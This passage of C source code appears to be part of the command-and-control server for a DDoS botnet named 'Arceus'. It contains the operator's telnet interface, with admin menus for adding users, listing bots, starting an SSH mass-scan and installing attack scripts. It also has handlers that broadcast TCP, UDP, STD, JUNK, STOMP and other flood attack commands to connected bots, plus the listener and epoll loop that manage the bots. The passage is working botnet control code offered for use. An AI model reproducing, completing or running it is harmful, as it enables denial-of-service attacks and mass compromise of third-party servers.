        if(send(thefd, method_12, strlen(method_12),  MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue; // Yep...
        }
/*
                              _____ _         __  __   __  __                  
                             / ____| |       / _|/ _| |  \/  |                 
                            | (___ | |_ __ _| |_| |_  | \  / | ___ _ __  _   _ 
                             \___ \| __/ _` |  _|  _| | |\/| |/ _ \ '_ \| | | |
                             ____) | || (_| | | | |   | |  | |  __/ | | | |_| |
                            |_____/ \__\__,_|_| |_|   |_|  |_|\___|_| |_|\__,_|
                                                                                         
                                                                                              */
        if(strstr(buf, ".staff") || strstr(buf, ".STAFF")) // Staff Only ! - Display Menu
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char staff_cmd1 [5000]; // Char Every Line For Output Communication
        char staff_cmd2 [5000]; // Char Every Line For Output Communication
        char staff_cmd3 [5000]; // Char Every Line For Output Communication
        char staff_cmd4 [5000]; // Char Every Line For Output Communication
        char staff_cmd5 [5000]; // Char Every Line For Output Communication
        char staff_cmd6 [5000]; // Char Every Line For Output Communication
        char staff_cmd7 [5000]; // Char Every Line For Output Communication
        char staff_cmd8 [5000]; // Char Every Line For Output Communication
        char staff_cmd9 [5000]; // Char Every Line For Output Communication

        sprintf(staff_cmd1,   "\e[38;5;201m╔═══════════════════════════════════════════════╗\r\n");
        sprintf(staff_cmd2,   "\e[38;5;201m║    \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mAdmin commands \e[38;5;201m- \e[38;5;202mAdmin Tools    \e[38;5;201m║\r\n");
        sprintf(staff_cmd3,   "\e[38;5;201m╠═══════════════════════════════════════════════\e[38;5;201m╣\r\n");
        sprintf(staff_cmd4,   "\e[38;5;201m║ \e[38;5;202m.adduser \e[38;5;201m[\e[38;5;202mUsername\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPassword\e[38;5;201m] \e[38;5;201m[\e[38;5;201madmin\e[38;5;201m/\e[38;5;201mnormal\e[38;5;201m] \e[38;5;201m║\r\n");
        sprintf(staff_cmd5,   "\e[38;5;201m║ \e[38;5;202m.bots \e[38;5;202m[\e[38;5;202mShows a list of connected devices\e[38;5;201m]     \e[38;5;201m║\r\n");
        sprintf(staff_cmd6,   "\e[38;5;201m║ \e[38;5;202m.scan \e[38;5;202m[\e[38;5;202mStarts SSH Mass-Scan\e[38;5;201m]                  \e[38;5;201m║\r\n");
        sprintf(staff_cmd7,   "\e[38;5;201m║ \e[38;5;202m.install \e[38;5;201m[\e[38;5;202mInstalls all needed IPHM Scripts\e[38;5;201m]   \e[38;5;201m║\r\n");
        sprintf(staff_cmd8,   "\e[38;5;201m║ \e[38;5;202m.next \e[38;5;201m[\e[38;5;202mShows next page, for scanners \e[38;5;201m(\e[38;5;202miphm\e[38;5;201m)\e[38;5;201m]  \e[38;5;201m║\r\n");
        sprintf(staff_cmd9,   "\e[38;5;201m╚═══════════════════════════════════════════════╝\r\n");


        if(send(thefd, staff_cmd1, strlen(staff_cmd1),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd2, strlen(staff_cmd2),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd3, strlen(staff_cmd3),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd4, strlen(staff_cmd4),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd5, strlen(staff_cmd5),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd6, strlen(staff_cmd6),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd7, strlen(staff_cmd7),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, staff_cmd8, strlen(staff_cmd8),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, staff_cmd9, strlen(staff_cmd9),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        { 
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // Terminate Connection.. Reinstate All Functions.
        }
        continue; // Let Us Continue.. We Are Nearly There..
        } 
/*
                                  _______          _       __  __                  
                                 |__   __|        | |     |  \/  |                 
                                    | | ___   ___ | |___  | \  / | ___ _ __  _   _ 
                                    | |/ _ \ / _ \| / __| | |\/| |/ _ \ '_ \| | | |
                                    | | (_) | (_) | \__ \ | |  | |  __/ | | | |_| |
                                    |_|\___/ \___/|_|___/ |_|  |_|\___|_| |_|\__,_|
                                                                                                 */
        if(strstr(buf, ".tools") || strstr(buf, ".TOOLS") || strstr(buf, ".tool") || strstr(buf, ".TOOL")) // Display Menu - Tools
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char tool1  [5000]; // Char Every Line For Output Communication
        char tool2  [5000]; // Char Every Line For Output Communication
        char tool3  [5000]; // Char Every Line For Output Communication
        char tool4  [5000]; // Char Every Line For Output Communication
        char tool5  [5000]; // Char Every Line For Output Communication
        char tool6  [5000]; // Char Every Line For Output Communication
        char tool7  [5000]; // Char Every Line For Output Communication
        sprintf(tool1, "              \e[38;5;201m╔═════════════════════════════════════╗\r\n");
        sprintf(tool2, "              \e[38;5;201m║  \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mUser Tools \e[38;5;201m- \e[38;5;202mTool CmDs  \e[38;5;201m║\r\n");
        sprintf(tool3, "              \e[38;5;201m╠═════════════════════════════════════╣\r\n");
        sprintf(tool4, "              \e[38;5;201m║ \e[38;5;202miplookup \e[38;5;201m[IP\e[38;5;201m] - \e[38;5;202mIP Geolocation      \e[38;5;201m║\r\n");
        sprintf(tool5, "              \e[38;5;201m║ \e[38;5;202mportscan \e[38;5;201m[IP\e[38;5;201m] - \e[38;5;202mPortScanner         \e[38;5;201m║\r\n");
        sprintf(tool6, "              \e[38;5;201m║ \e[38;5;202mresolve \e[38;5;201m[HOST\e[38;5;201m] - \e[38;5;202mHostname Resolver  \e[38;5;201m║\r\n");
        sprintf(tool7, "              \e[38;5;201m╚═════════════════════════════════════╝\r\n");
        if(send(thefd, tool1, strlen(tool1),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, tool2, strlen(tool2),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, tool3, strlen(tool3),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, tool4, strlen(tool4),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, tool5, strlen(tool5),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, tool6, strlen(tool6),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, tool7, strlen(tool7),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // / Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // Terminate Function Once Again, We Need More Stability..
        }
        continue;
        } 
        if(strstr(buf, ".logout")  || strstr(buf, ".LOGOUT")) // Logout Command, So The User Exits Safely And In Fashion.. Of course...
        {
        printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mHas Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("Arceus_Logout.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m]\e[38;5;202m User\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\e[38;5;202m Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOP")) // STOP OUR ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "              \e[38;5;201m╔═══════════════════════════════╗\r\n              \e[38;5;201m║      \e[38;5;202mWhy did you stop? ):     \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mTesting something perhaps?   \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mMeh, its oki, i stopped </3  \e[38;5;201m║\r\n              \e[38;5;201m╚═══════════════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRUSH")) // CRUSH ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: CRUSH        \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: STD x TCP     \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "COMBO")) // COMBO ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: COMBO        \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: JUNK x HOLD   \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "TCP")) // TCP ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: TCP          \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: TCPFLOOD      \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "UDP")) // UDP ATTACK
        {  // Let Us Continue Our Journey! ╚═════════════════════════════╝ X 31 ||  
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: UDP         \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: UDPFLOOD     \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STD")) // STD ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!      \e[38;5;201m   ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: STD       \e[38;5;201m   ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: STDFLOOD   \e[38;5;201m   ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOMP")) // STOMP ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!           \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: STOMP          \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: UDP x STD x TCP \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚════════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "JUNK")) // JUNK ATTACK
        {  // Let Us Continue Our Journey! ╚══════════════════════╝ x 24 || ╔════════════════════════╗ x 26
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: JUNK        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: JUNKFLOOD    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(strlen(buf) == 0) continue;
        printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;201m- \e[38;5;202mCommand\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("Arceus_C2.log", "a"); // Log Our User -- Just In Case There Are 'Certain Problems'
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;93m- \e[38;5;202mCommand\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n", accounts[find_line].user, buf);
        fclose(logFile); // Close The Log File
        broadcast(buf, thefd, usernamez); // Broadcast The Following Stated -- [Buffer, thefd, Usernames]
        memset(buf, 0, 2048); // Set Data Block And Buffer Size --> 0 -- 2048
        } // Let Us Continue Our Journey!
        end:    // cleanup dead socket
        managements[thefd].connected = 0; // Managments Connected, Decrease Value To The Following Value
        close(thefd); // Close..
        managesConnected--; // Display New Value [May Change Output Sequence Later.. It Is Quite Stable]
}
 
void *telnetListener(int port) // Void, Certain Elements That Will Tailor The Client... [SOCKET INTERPRETATION II.2] -- [STILL IN BETA STAGES, WORK IN PROGRESS...]
{    
        int sockfd, newsockfd; // Create Integer For Socket-Feed, New Socket Feed, Automatically Will Write A New Call -- 
        socklen_t clilen; // New Call Name - Unecessary, But Just Incase, Compiling Is Very Needy And Dependent..
        struct sockaddr_in serv_addr, cli_addr; // Create Struct. For Socket Address.. This Will Subside With Client Address
        sockfd = socket(AF_INET, SOCK_STREAM, 0); // New Socket Interpreter -- [Made By Zach, I Will Change Subsiding Unit Once Connection Has Been Made]
        if (sockfd < 0) perror("ERROR opening socket"); // Socket Error Handling, The Stated Integer Value SHOULD NOT Be Greater Than 0 If So, Display Error
        bzero((char *) &serv_addr, sizeof(serv_addr)); // We Will Char An Output Communication Towards The Socket, The Broadcast Will Be Constant
        serv_addr.sin_family = AF_INET; // Our Socket Properties Will Be Set, Using AF_INET. Everything Together = Sin.Family
        serv_addr.sin_addr.s_addr = INADDR_ANY; // Sin Address, Is The Internet Address, It Will Be Set Due To The Client Sending An Income Packet [Test Packet]
        serv_addr.sin_port = htons(port); // Using 'htons' We Will Convert The Port Value, Into A Network Integer For The Server To Communicate Properly
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("[Arceus] Screening Error"); // Error Handling Output - Probably Using The Same Port As The Listener
        listen(sockfd,5); // Use Listen Function - Using The '5' Value
        clilen = sizeof(cli_addr); // Define 'clilen' With The Size Of Our Client Address [ User Connecting To The C2 ]
        while(1)
        {  printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mIncoming User Connection From "); // Client Size == The IP Of The User Connecting
       
        client_addr(cli_addr); // Set Client Address, As Variable In Order To Log
        FILE *logFile; // Use LogFILE Function
        logFile = fopen("Arceus_Connection.log", "a"); // Create Our Log File..                           |Here Is The Output On The Admin Screen|
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mIncoming User Connection From \e[38;5;202mIP:\e[38;5;93m[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile); // Close Our Log File, After Connection [Client Address] Has Been Logged..
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); // Accept New Socket, Minimises Error Of Binding Failure
        if (newsockfd < 0) perror("ERROR on accept"); // Output An Acceptance -- Something's Went Wrong -- Hard To Detail
        pthread_t thread; // Use Pthread, To Set All Network Functions As One Thread -- [So We Can Parse Threads To The Client]
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd); // Create The Thread '&thread, NULL, &telnetWorker, (void *)newsockfd'
        }
}
 
int main (int argc, char *argv[], void *sock) // Set Integers For Arguements - Then Char For Output Communication
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port; // Creating Integers For 'Threads & Port'
        struct epoll_event event; // Create Struct, For EPOLL, We Will Use This For Our Sockets
        if (argc != 4) // Set Argument Value, [Default Execution Output Argument Value]
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]); // Display Help [Only If All Arguments Have Not Been Applied]
        exit (EXIT_FAILURE); // No Failure, Just No Arguments
        }
        port = atoi(argv[3]); // Set Argument Value '3' - For Port
        threads = atoi(argv[2]); // Set Argument Value '2' - For Threads
        if (threads > 1000) // Thread Limit - Change It If You Want - These Are My Recommendations
        {
        printf("[Arceus] Thread Limit Exceeded! Please Lower Threat Count!\n"); // Are You Stupid? - Do You Wanna Really Try To Broadcast With EXTREME Network Output??
        return 0; // Kill
        }
        else if (threads < 1000) // You Have Picked A Reasonible Thread Number - Thank You For Listening To Me :)
        {
        printf(""); // printf("Well Done You Absolute Uncultured Swine, You Aren't A Skid After All...");
        }
        printf("\e[38;5;201m╔═══════════════════════════════════╗\r\n\e[38;5;201m║         \e[38;5;93mWelcome To Arceus         \e[38;5;201m║\r\n\e[38;5;201m║         \e[38;5;93mC2 x Telnet Layer         \e[38;5;201m╠════════╗\r\n\e[38;5;201m║  \e[38;5;93mServer Is Sucessfully Screened!  \e[38;5;201m║        ║     ╔════════════════════════╗\r\n\e[38;5;201m╚═════╦═════════════════════════════╝        ╚═════╣ \e[38;5;93mCreated By Jack x Zach \e[38;5;201m║\r\n      \e[38;5;201m║                                            ╚═════╦══════════════════╝\r\n      \e[38;5;201m║   ╔════╗                                         \e[38;5;201m║\r\n      \e[38;5;201m╚═══╣ \e[38;5;93m<3 \e[38;5;201m╠═════╗         ╔════════════╗            \e[38;5;201m║\r\n          \e[38;5;201m╚════╝     ║         ║ \e[38;5;93mRIP Katura \e[38;5;201m╠════════════╝\r\n                     \e[38;5;201m║         ╚═══╦════════╝\r\n                     \e[38;5;201m║             ║\r\n                     \e[38;5;201m║             ║\r\n                     \e[38;5;201m╚═════════════╝\r\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort(); // Killing Myself
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort(); // Killing Myself
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1) // Check If I Wanna Die..
        {
        perror ("listen"); // Listen - Error
        abort (); // Yep, I wanna die..
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1) // Check If I Wanna Die Again..
        {
        perror ("epoll_create"); // EPOLL_ERROR - Yeah...
        abort (); // Okay Sure, Let's Die..
        }
        event.data.fd = listenFD; // EPOLL_EVENT DATA
        event.events = EPOLLIN | EPOLLET; // EPOLL_USE MODULES
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event); // EPOLL_USE_MODULES -- USE FUNCTION : (epollFD, EPOLL_CTL_ADD, listenFD, &event)
        if (s == -1) // Check If I Wanna Die Again..
        {
        perror ("epoll_ctl");
        abort (); // Yeah, Let's Die.. One More Time..
        }
        pthread_t thread[threads + 2]; // Use Pthread Thread + 2, Because We Want A Strong Independent Connection
        while(threads--) // While [Thread Count]
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port); // Make A Thread To Individually Subside The Network Functions To The Client
        while(1) // Let's Wait A WHILE... [1 Second.. We Want Stability.. Right??]
        {
        broadcast("PING", -1, "STRING"); // Broadcast
        sleep(60); // Lemme Sleep The Thread For 60 Seconds..
        }
        close (listenFD); // Close The Listening FileD, Socket -- Terminate Concurrent Function
        return EXIT_SUCCESS; // Exit Successfully, Using Return Statement.
} // Arceus I [BETA]